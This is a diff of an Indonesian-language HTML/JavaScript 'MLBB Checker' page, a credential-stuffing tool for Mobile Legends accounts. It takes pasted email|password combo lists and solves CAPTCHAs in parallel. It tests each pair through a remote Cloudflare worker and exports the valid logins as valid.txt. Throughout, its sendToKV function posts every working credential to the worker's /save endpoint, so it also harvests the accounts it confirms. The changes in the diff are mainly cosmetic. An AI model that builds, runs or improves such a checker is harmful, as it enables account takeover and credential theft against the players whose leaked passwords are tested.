@@ -2,197 +2,143 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>MLBB Checker Itachi Edition Cinematic</title>
+<title>MLBB Checker By Arif Hidayatulloh</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 <script src="https://cstaticdun.126.net/load.min.js"></script>
 <style>
-body {
-  font-family: 'Poppins', sans-serif;
-  max-width: 1100px;
-  margin: 40px auto;
-  padding: 20px;
-  background: linear-gradient(135deg, #1f1c2c, #928dab);
-  color: #f5f5f5;
-  position: relative;
-  overflow-x: hidden;
-}
+  body {
+    font-family: 'Poppins', sans-serif;
+    max-width: 1100px;
+    margin: 40px auto;
+    padding: 20px;
+    background: linear-gradient(135deg, #1f1c2c, #928dab);
+    color: #f5f5f5;
+  }
 
-h2 {
-  text-align: center;
-  margin-bottom: 20px;
-  font-weight: 700;
-  font-size: clamp(26px, 5vw, 40px);
-  background: linear-gradient(45deg, #ff007f, #6a11cb, #00c6ff);
-  background-clip: text;
-  -webkit-background-clip: text;
-  color: transparent;
-  animation: glowingText 2s ease-in-out infinite alternate;
-}
+  h2 {
+    text-align: center;
+    margin-bottom: 40px;
+    font-weight: 700;
+    font-size: 40px;
+    color: #f5f5f5;
+    text-shadow: 3px 3px 8px rgba(0, 0, 0, 0.5), 0 0 25px rgba(255, 255, 255, 0.3), 0 0 5px rgba(0, 0, 0, 0.5);
+    letter-spacing: 2px;
+    background: -webkit-linear-gradient(45deg, #ff007f, #6a11cb, #00c6ff);
+    background-clip: text;
+    -webkit-background-clip: text;
+    animation: glowingText 2s ease-in-out infinite alternate;
+  }
 
-@keyframes glowingText {
-  0% { text-shadow: 0 0 5px rgba(255,255,255,0.6); }
-  50% { text-shadow: 0 0 20px rgba(255,0,0,0.8); }
-  100% { text-shadow: 0 0 5px rgba(255,255,255,0.6); }
-}
+  @keyframes glowingText {
+    0% {
+      text-shadow: 0 0 5px rgba(255, 255, 255, 0.6), 0 0 10px rgba(255, 255, 255, 0.4);
+    }
+    50% {
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.8), 0 0 20px rgba(0, 255, 255, 0.7), 0 0 30px rgba(0, 255, 255, 0.6);
+    }
+    100% {
+      text-shadow: 0 0 5px rgba(255, 255, 255, 0.6), 0 0 10px rgba(255, 255, 255, 0.4);
+    }
+  }
 
-textarea {
-  width: 100%;
-  height: 180px;
-  font-family: monospace;
-  border-radius: 10px;
-  border: none;
-  padding: 15px;
-  resize: none;
-  background: rgba(255,255,255,0.05);
-  color: #fff;
-  box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
-}
+  p {
+    text-align: center;
+    font-size: 14px;
+    color: #dcdcdc;
+    margin-bottom: 30px;
+  }
 
-button {
-  padding: 12px 20px;
-  font-weight: 600;
-  border-radius: 8px;
-  border: none;
-  cursor: pointer;
-  margin: 5px;
-  transition: all 0.3s;
-}
+  textarea {
+    width: 100%;
+    height: 180px;
+    font-family: monospace;
+    border-radius: 10px;
+    border: none;
+    padding: 15px;
+    resize: none;
+    background: rgba(255,255,255,0.05);
+    color: #fff;
+    box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
+  }
 
-#startBtn { background: #6a11cb; color: #fff; }
-#startBtn:hover { background: #2575fc; }
-#stopBtn { background: #fc5c7d; color: #fff; }
-#stopBtn:hover { background: #ff758c; }
-#downloadBtn { background: #00c6ff; color: #fff; }
-#downloadBtn:hover { background: #0072ff; }
+  button {
+    padding: 12px 20px;
+    font-weight: 600;
+    border-radius: 8px;
+    border: none;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    margin-right: 10px;
+  }
 
-#captcha-container {
-  margin: 20px 0;
-  display: flex;
-  flex-wrap: wrap;
-  gap: 20px;
-  justify-content: center;
-}
+  #startBtn { background: #6a11cb; color: #fff; }
+  #startBtn:hover { background: #2575fc; }
 
-#captcha-root-0, #captcha-root-1 {
-  background: rgba(255,255,255,0.05);
-  padding: 15px;
-  border-radius: 12px;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.4);
-}
+  #stopBtn { background: #fc5c7d; color: #fff; }
+  #stopBtn:hover { background: #ff758c; }
 
-#log {
-  background: rgba(0,0,0,0.6);
-  color: #eee;
-  height: 300px;
-  overflow-y: auto;
-  padding: 15px;
-  font-family: monospace;
-  white-space: pre-wrap;
-  border-radius: 12px;
-  box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-  margin-top: 10px;
-}
+  #downloadBtn { background: #00c6ff; color: #fff; }
+  #downloadBtn:hover { background: #0072ff; }
 
-.ok { color: #7CFC00; }
-.bad { color: #FF6B6B; }
-.info { color: #FFD866; }
+  #captcha-container {
+    margin: 20px 0;
+    display: flex;
+    gap: 30px;
+    justify-content: center;
+  }
 
-#status {
-  margin-top: 15px;
-  font-weight: 600;
-  text-align: center;
-  font-size: 16px;
-  color: #ffffff;
-}
+  #captcha-root-0, #captcha-root-1 {
+    background: rgba(255,255,255,0.05);
+    padding: 20px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  }
 
-/* Efek Cinematic Itachi - Mobile Friendly */
-#itachi-effect {
-  pointer-events: none;
-  position: fixed;
-  top:0; left:0;
-  width:100%;
-  height:100%;
-  display: none;
-  justify-content:center;
-  align-items:center;
-  z-index: 9999;
-  background: rgba(0,0,0,0.85);
-}
+  #log {
+    background: rgba(0,0,0,0.6);
+    color: #eee;
+    height: 300px;
+    overflow-y: auto;
+    padding: 15px;
+    font-family: monospace;
+    white-space: pre-wrap;
+    border-radius: 12px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    margin-top: 10px;
+  }
 
-#itachi-eye {
-  position:absolute;
-  width: clamp(150px, 40vw, 250px);
-  height: clamp(150px, 40vw, 250px);
-  background: url('https://i.ibb.co/8m5GzHq/itachi-eye.png') no-repeat center center;
-  background-size: contain;
-  opacity:0;
-  transform: scale(0);
-}
+  .ok { color: #7CFC00; }
+  .bad { color: #FF6B6B; }
+  .info { color: #FFD866; }
 
-.smoke {
-  position: absolute;
-  width: 200%;
-  height: 200%;
-  background: radial-gradient(circle, rgba(255,0,0,0.35) 0%, transparent 70%);
-  animation: smokeAnim 3s infinite;
-}
+  #status {
+    margin-top: 15px;
+    font-weight: 600;
+    text-align: center;
+    font-size: 16px;
+    color: #ffffff;
+  }
 
-@keyframes smokeAnim {
-  0% { transform: scale(1) translateY(0); opacity: 0.5; }
-  50% { transform: scale(1.2) translateY(-20px); opacity: 0.7; }
-  100% { transform: scale(1) translateY(0); opacity: 0.5; }
-}
-
-.particles {
-  position: absolute;
-  width:100%;
-  height:100%;
-  background: url('https://i.ibb.co/jzYnDwp/blood.png') repeat;
-  opacity:0;
-}
-
-@keyframes eyeZoom {
-  0% { opacity:0; transform: scale(0); }
-  40% { opacity:1; transform: scale(1.4); }
-  70% { transform: scale(1); }
-  100% { opacity:1; transform: scale(1); }
-}
-
-@keyframes sharinganBlink {
-  0% { transform: scale(1); filter: brightness(1); }
-  25% { transform: scale(1.1); filter: brightness(1.5); }
-  50% { transform: scale(1); filter: brightness(1); }
-  75% { transform: scale(1.1); filter: brightness(1.5); }
-  100% { transform: scale(1); filter: brightness(1); }
-}
-
-@keyframes eyeZoomOut {
-  0% { transform: scale(1); opacity: 1; }
-  100% { transform: scale(0.5); opacity: 0; }
-}
-
-@keyframes particlesFade {
-  0% { opacity: 0; transform: scale(1.2); }
-  50% { opacity: 0.8; transform: scale(1); }
-  100% { opacity: 0; transform: scale(0.8); }
-}
+  #log::-webkit-scrollbar { width: 8px; }
+  #log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
+  #log::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
 </style>
 </head>
 <body>
 
-<h2>MLBB Checker Itachi Edition</h2>
-<p style="text-align:center;">Paste akun (email|password). Efek Itachi akan muncul untuk akun valid.</p>
+<h2>MLBB Checker By Arif Hidayatulloh</h2>
+<p>Paste daftar akun (email|password per baris). Akan muncul 2 CAPTCHA sekaligus. Hasil langsung muncul di log.</p>
 
-<textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com|Pass456"></textarea>
+<textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com|Pass456"></textarea>
 <br>
-<div style="text-align:center; margin-top: 15px; flex-wrap: wrap;">
+<div style="text-align:center; margin-top: 15px;">
   <button id="startBtn">Start Checking</button>
   <button id="stopBtn" disabled>Stop</button>
   <button id="downloadBtn">Download valid.txt</button>
 </div>
 
 <div id="status"></div>
+
 <div id="captcha-container">
   <div id="captcha-root-0"></div>
   <div id="captcha-root-1"></div>
@@ -201,20 +147,14 @@ button {
 <h3 style="text-align:center; margin-top:30px;">Log:</h3>
 <div id="log"></div>
 
-<!-- Itachi effects -->
-<div id="itachi-effect">
-  <div id="itachi-eye"></div>
-</div>
-
-<!-- Audio -->
-<audio id="itachi-sound" src="https://www.myinstants.com/media/sounds/itachi-teleport.mp3"></audio>
-<audio id="genjutsu-sound" src="https://www.myinstants.com/media/sounds/genjutsu.mp3"></audio>
-<audio id="whoosh-sound" src="https://www.myinstants.com/media/sounds/anime-whoosh.mp3"></audio>
-
 <script>
-const CAPTCHA_IDS = ["fef5c67c39074e9d845f4bf579cc07af","fef5c67c39074e9d845f4bf579cc07af"];
+const CAPTCHA_IDS = ["fef5c67c39074e9d845f4bf579cc07af", "fef5c67c39074e9d845f4bf579cc07af"];
 const WORKER_URL = "https://hidayat.bonar7527.workers.dev";
-let combos=[], stopRequested=false, neCaptchaInstances=[null,null], validAccounts=[];
+
+let combos = [];
+let stopRequested = false;
+let neCaptchaInstances = [null, null];
+let validAccounts = [];
 
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
@@ -222,7 +162,10 @@ const startBtn = document.getElementById("startBtn");
 const stopBtn = document.getElementById("stopBtn");
 const downloadBtn = document.getElementById("downloadBtn");
 
-function appendLog(text, cls){
+// Audio Sharingan
+const sharinganAudio = new Audio("https://www.myinstants.com/media/sounds/sharingan.mp3"); // ganti URL jika perlu
+
+function appendLog(text, cls) {
   const time = new Date().toLocaleTimeString();
   const div = document.createElement("div");
   div.textContent = `[${time}] ${text}`;
@@ -231,142 +174,162 @@ function appendLog(text, cls){
   logEl.scrollTop = logEl.scrollHeight;
 }
 
-function parseCombos(text){
-  return text.split(/\r?\n/).map(l=>l.trim()).filter(Boolean).map(line=>{
-    if(line.includes("|")) { const [e,p]=line.split("|",2); return {email:e.trim(),password:p.trim()};}
-    else if(line.includes(":")){ const [e,p]=line.split(":",2); return {email:e.trim(),password:p.trim()}; }
-    else { appendLog(`Format salah dilewati: ${line}`, "info"); return null; }
+function parseCombos(text) {
+  return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
+    if(line.includes("|")) {
+      const [e,p] = line.split("|",2);
+      return { email: e.trim(), password: p.trim() };
+    } else if(line.includes(":")) {
+      const [e,p] = line.split(":",2);
+      return { email: e.trim(), password: p.trim() };
+    } else {
+      appendLog(`Format salah dan dilewati: ${line}`, "info");
+      return null;
+    }
   }).filter(Boolean);
 }
 
-function showCaptcha(index){
-  return new Promise((resolve,reject)=>{
-    const root=document.getElementById("captcha-root-"+index);
-    root.innerHTML="";
-    if(!window.initNECaptcha){ reject("initNECaptcha missing"); return; }
-    if(neCaptchaInstances[index]?.destroy) neCaptchaInstances[index].destroy();
-    try{
+function showCaptcha(index) {
+  return new Promise((resolve, reject) => {
+    const root = document.getElementById("captcha-root-" + index);
+    root.innerHTML = "";
+    if(!window.initNECaptcha) {
+      appendLog("initNECaptcha tidak tersedia", "info");
+      reject("initNECaptcha missing");
+      return;
+    }
+
+    if(neCaptchaInstances[index] && typeof neCaptchaInstances[index].destroy === "function") {
+      neCaptchaInstances[index].destroy();
+      neCaptchaInstances[index] = null;
+    }
+
+    try {
       initNECaptcha({
         captchaId: CAPTCHA_IDS[index],
-        element: "#captcha-root-"+index,
+        element: "#captcha-root-" + index,
         mode: "embed",
-        width: "100%",
-        onReady(){},
-        onVerify(err,data){
-          if(err||!data?.validate){ reject(err||"no token"); return; }
-          const token=data.validate;
-          neCaptchaInstances[index]?.destroy();
+        width: "320px",
+        onReady() {},
+        onVerify(err, data) {
+          if(err || !data || !data.validate) {
+            appendLog(`Captcha ${index+1} gagal`, "info");
+            reject(err || "no token");
+            return;
+          }
+          const token = data.validate;
+          if(neCaptchaInstances[index] && typeof neCaptchaInstances[index].destroy === "function") {
+            neCaptchaInstances[index].destroy();
+            neCaptchaInstances[index] = null;
+          }
           resolve(token);
         },
-        onLoad(instance){ neCaptchaInstances[index]=instance; }
+        onLoad(instance) {
+          neCaptchaInstances[index] = instance;
+        }
       });
-    } catch(e){ reject(e); }
+    } catch(e) {
+      appendLog(`Captcha ${index+1} gagal inisialisasi: ${e}`, "info");
+      reject(e);
+    }
   });
 }
 
-async function sendToKV(account){
-  try{ await fetch(WORKER_URL+"/save",{method:"POST",body:JSON.stringify(account),headers:{"Content-Type":"application/json"}}); }catch(e){}
+async function sendToKV(account) {
+  try {
+    await fetch(WORKER_URL + "/save", {
+      method: "POST",
+      body: JSON.stringify(account),
+      headers: { "Content-Type": "application/json" }
+    });
+  } catch(e) {
+    console.error("Gagal kirim ke KV:", e);
+  }
 }
 
-function triggerItachiEffect(){
-  const effect=document.getElementById("itachi-effect");
-  const eye=document.getElementById("itachi-eye");
-
-  const soundTeleport=document.getElementById("itachi-sound");
-  const genjutsuSound=document.getElementById("genjutsu-sound");
-  const whooshSound=document.getElementById("whoosh-sound");
-
-  const smoke = document.createElement("div");
-  smoke.className = "smoke";
-  const particles = document.createElement("div");
-  particles.className = "particles";
-  effect.appendChild(smoke);
-  effect.appendChild(particles);
-
-  effect.style.display="flex";
-
-  eye.style.animation="eyeZoom 1.5s forwards";
-  soundTeleport.currentTime=0;
-  soundTeleport.play();
-
-  setTimeout(()=>{
-    eye.style.animation="sharinganBlink 0.6s 2";
-    genjutsuSound.currentTime=0;
-    genjutsuSound.play();
-    particles.style.animation="particlesFade 1.5s forwards";
-  }, 1500);
-
-  setTimeout(()=>{
-    eye.style.animation="eyeZoomOut 1s forwards";
-    whooshSound.currentTime=0;
-    whooshSound.play();
-  }, 2200);
-
-  setTimeout(()=>{
-    effect.style.display="none";
-    smoke.remove();
-    particles.remove();
-    eye.style.animation="";
-  }, 3200);
-}
-
-async function checkOneAccount(account,index){
-  appendLog(`Minta captcha untuk ${account.email}`,"info");
-  statusEl.textContent=`Checking ${account.email}`;
+async function checkOneAccount(account, index) {
+  appendLog(`Minta captcha untuk ${account.email}`, "info");
+  statusEl.textContent = `Checking ${account.email}`;
   let token;
-  try{ token=await showCaptcha(index); } catch(e){ appendLog(`Captcha gagal: ${account.email}`, "bad"); return; }
-  appendLog(`Token captcha diterima ${account.email}`, "info");
-  try{
-    const form=new URLSearchParams();
+  try {
+    token = await showCaptcha(index);
+  } catch(e) {
+    appendLog(`Captcha gagal untuk ${account.email}: ${e}`, "bad");
+    return;
+  }
+  appendLog(`Token captcha diterima untuk ${account.email}`, "info");
+
+  try {
+    const form = new URLSearchParams();
     form.append("email", account.email);
     form.append("password", account.password);
     form.append("e_captcha", token);
-    const resp=await fetch(WORKER_URL+"/check",{method:"POST",body:form,headers:{"Content-Type":"application/x-www-form-urlencoded"}});
-    const data=await resp.json();
-    if(data.code===0&&data.data){
-      appendLog(`VALID => ${account.email}`,"ok");
+
+    const resp = await fetch(WORKER_URL + "/check", {
+      method: "POST",
+      body: form,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" }
+    });
+
+    const data = await resp.json();
+
+    if(data.code === 0 && data.data) {
+      appendLog(`VALID => ${account.email}`, "ok");
       validAccounts.push(`${account.email}:${account.password}`);
-      triggerItachiEffect();
-      sendToKV({email:account.email,password:account.password});
-    } else if(data.code===1004){ appendLog(`NOT FOUND => ${account.email}`,"bad"); }
-    else if(data.code===1005){ appendLog(`WRONG PASSWORD => ${account.email}`,"bad"); }
-    else { appendLog(`Gagal => ${account.email} | ${JSON.stringify(data)}`,"bad"); }
-  }catch(e){ appendLog(`Error ${account.email}: ${e}`,"bad"); }
+      sendToKV({ email: account.email, password: account.password });
+
+      // Putar suara Sharingan
+      sharinganAudio.currentTime = 0;
+      sharinganAudio.play().catch(err => console.log("Audio error:", err));
+
+    } else if(data.code === 1004) {
+      appendLog(`NOT FOUND => ${account.email}`, "bad");
+    } else if(data.code === 1005) {
+      appendLog(`WRONG PASSWORD => ${account.email}`, "bad");
+    } else {
+      appendLog(`Gagal => ${account.email} | ${JSON.stringify(data)}`, "bad");
+    }
+
+  } catch(e) {
+    appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
+  }
 }
 
-function updateTextareaCombos(){ document.getElementById("combo").value = combos.map(a=>`${a.email}|${a.password}`).join("\n"); }
+async function startChecking() {
+  combos = parseCombos(document.getElementById("combo").value);
+  if(combos.length === 0) {
+    appendLog("Tidak ada combo valid", "info");
+    return;
+  }
+  stopRequested = false;
+  startBtn.disabled = true;
+  stopBtn.disabled = false;
 
-async function startProcess(){
-  stopRequested=false;
-  startBtn.disabled=true; stopBtn.disabled=false;
-  logEl.innerHTML=""; validAccounts=[];
-  combos=parseCombos(document.getElementById("combo").value);
-  if(combos.length===0){ appendLog("Tidak ada akun untuk dicek","info"); startBtn.disabled=false; stopBtn.disabled=true; return; }
-  appendLog(`Mulai cek ${combos.length} akun.`,"info");
-
-  async function processCaptcha(index){
-    while(!stopRequested && combos.length>0){
-      const account=combos.shift();
-      updateTextareaCombos();
-      await checkOneAccount(account,index);
-    }
+  for(let i=0; i<combos.length; i++) {
+    if(stopRequested) break;
+    await checkOneAccount(combos[i], i % 2);
   }
 
-  await Promise.all([processCaptcha(0), processCaptcha(1)]);
-  appendLog("Selesai","info");
-  statusEl.textContent="Selesai";
-  startBtn.disabled=false; stopBtn.disabled=true;
+  appendLog("Selesai checking.", "info");
+  startBtn.disabled = false;
+  stopBtn.disabled = true;
 }
 
-startBtn.addEventListener("click",startProcess);
-stopBtn.addEventListener("click",()=>{ stopRequested=true; stopBtn.disabled=true; });
-downloadBtn.addEventListener("click",()=>{
-  if(validAccounts.length===0){ alert("Belum ada akun valid."); return; }
-  const blob=new Blob([validAccounts.join("\n")],{type:"text/plain"});
-  const url=URL.createObjectURL(blob);
-  const a=document.createElement("a");
-  a.href=url; a.download="valid.txt"; a.click(); URL.revokeObjectURL(url);
+startBtn.addEventListener("click", startChecking);
+stopBtn.addEventListener("click", () => { stopRequested = true; appendLog("Stop diminta", "info"); });
+downloadBtn.addEventListener("click", () => {
+  if(validAccounts.length === 0) { appendLog("Tidak ada akun valid untuk di-download", "info"); return; }
+  const blob = new Blob([validAccounts.join("\n")], { type: "text/plain" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "valid.txt";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
 });
 </script>
+
 </body>
 </html>
